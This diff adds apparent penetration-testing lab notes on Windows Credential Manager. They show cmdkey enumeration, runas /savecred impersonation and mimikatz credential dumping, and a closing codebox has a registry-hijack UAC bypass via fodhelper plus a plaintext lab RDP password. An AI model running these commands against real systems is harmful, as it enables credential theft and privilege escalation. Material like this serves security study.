@@ -1,0 +1,169 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="85" master_id="0" name="Windows Vault and Credential Manager" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1767364672" ts_lastsave="1767369021">
+    <rich_text>&#13;&#13;• </rich_text>
+    <rich_text family="monospace">%UserProfile%\AppData\Local\Microsoft\Vault\</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text family="monospace">%UserProfile%\AppData\Local\Microsoft\Credentials\</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text family="monospace">%UserProfile%\AppData\Roaming\Microsoft\Vault\</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text family="monospace">%ProgramData%\Microsoft\Vault\</rich_text>
+    <rich_text>
+• </rich_text>
+    <rich_text family="monospace">%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</rich_text>
+    <rich_text>
+
+&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">Credential Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders</rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">It is possible to export Windows Vaults to </rich_text>
+    <rich_text family="monospace">.crd</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd"> files either via Control Panel or with the following command. 
+Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text family="monospace">C:\Users\sadams&gt;rundll32 keymgr.dll,KRShowKeyMgr</rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">We can use </rich_text>
+    <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">cmdkey</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd"> to enumerate the credentials stored in the current user's profile:</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text family="monospace">C:\Users\sadams&gt;whoami
+srv01\sadams
+
+C:\Users\sadams&gt;cmdkey /list
+
+Currently stored credentials:
+
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic
+    User: 02hejubrtyqjrkfi
+    Local machine persistence
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles</rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd">The first credential in the command output above, </rich_text>
+    <rich_text justification="left" family="monospace" foreground="#a4b1cd">virtualapp/didlogical</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd">, is a generic credential used by Microsoft account/Windows Live services. 
+The random looking username is an internal account ID. This entry may be ignored for our purposes.</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd">The second credential, </rich_text>
+    <rich_text justification="left" family="monospace" foreground="#a4b1cd">Domain:interactive=SRV01\mcharles</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd">, is a domain credential associated with the user SRV01\mcharles. 
+</rich_text>
+    <rich_text justification="left" family="monospace" foreground="#a4b1cd">Interactive</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd"> means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use </rich_text>
+    <rich_text justification="left" family="monospace" foreground="#a4b1cd">runas</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd"> to impersonate the stored user like so:</rich_text>
+    <rich_text>
+&#13;&#13;&#13;</rich_text>
+    <rich_text family="monospace">C:\Users\sadams&gt;runas /savecred /user:SRV01\mcharles cmd
+Attempting to start cmd as user "SRV01\mcharles" ...</rich_text>
+    <rich_text>&#13;&#13;</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left" foreground="#a4b1cd">Stored credentials are listed with the following format:</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+&#13;
+Extracting Credentials&#13;&#13;&#13;</rich_text>
+    <rich_text family="monospace">C:\Users\Administrator\Desktop&gt; mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+
+...SNIP...
+
+Authentication Id : 0 ; 630472 (00000000:00099ec8)
+Session           : RemoteInteractive from 3
+User Name         : mcharles
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 4/27/2025 2:40:32 AM
+SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
+        credman :
+         [00000000]
+         * Username : mcharles@inlanefreight.local
+         * Domain   : onedrive.live.com
+         * Password : ...SNIP...</rich_text>
+    <rich_text>&#13;
+         
+         &#13;&#13;
+</rich_text>
+    <table char_offset="384" justification="left" col_min="500" col_max="500" col_widths="0,0">
+      <row>
+        <cell>Web Credentials</cell>
+        <cell>Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge.</cell>
+      </row>
+      <row>
+        <cell>Windows Credentials</cell>
+        <cell>Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.</cell>
+      </row>
+      <row>
+        <cell>Name</cell>
+        <cell>Description</cell>
+      </row>
+    </table>
+    <encoded_png char_offset="1755" justification="left" link="webs https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/CredMan_3.png" sha256sum="b9c06a1bdf74863bb34470246329f1a90414337b5f5e94b2758619588165b6ca"/>
+    <table char_offset="1818" justification="left" col_min="500" col_max="500" col_widths="0,0">
+      <row>
+        <cell>Target</cell>
+        <cell>The resource or account name the credential is for. This could be a computer, domain name, or a special identifier.</cell>
+      </row>
+      <row>
+        <cell>Type</cell>
+        <cell>The kind of credential. Common types are Generic for general credentials, and Domain Password for domain user logons.</cell>
+      </row>
+      <row>
+        <cell>User</cell>
+        <cell>The user account associated with the credential.</cell>
+      </row>
+      <row>
+        <cell>Persistence</cell>
+        <cell>Some credentials indicate whether a credential is saved persistently on the computer; credentials marked with Local machine persistence survive reboots.</cell>
+      </row>
+      <row>
+        <cell>Key</cell>
+        <cell>Value</cell>
+      </row>
+    </table>
+    <codebox char_offset="2834" justification="left" frame_width="1749" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">Initial Enum:
+xfreerdp /u:sadams /p:”totally2brow2harmon@” /v:&lt;IP&gt;
+cmdkey /list
+runas /user:SRV01\mcharles /savecred cmd
+cmdkey /list
+
+UAC BYPASS:
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" &amp;&amp; start fodhelper.exe
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f &amp;&amp; reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f &amp;&amp; start computerdefaults.exe&#13;
+Download mimikatz and create smbshare to pass it over:
+xfreerdp /u:sadams /p:"totally2brow2harmon@" /v:10.129.234.171 \&#13;
+/drive:share,/home/&lt;USER&gt;/mimikatz
+
+Use mimikatz:
+mimikatz.exe
+privilege::debug&#13;
+vault::cred
+
+</codebox>
+  </node>
+</cherrytree>
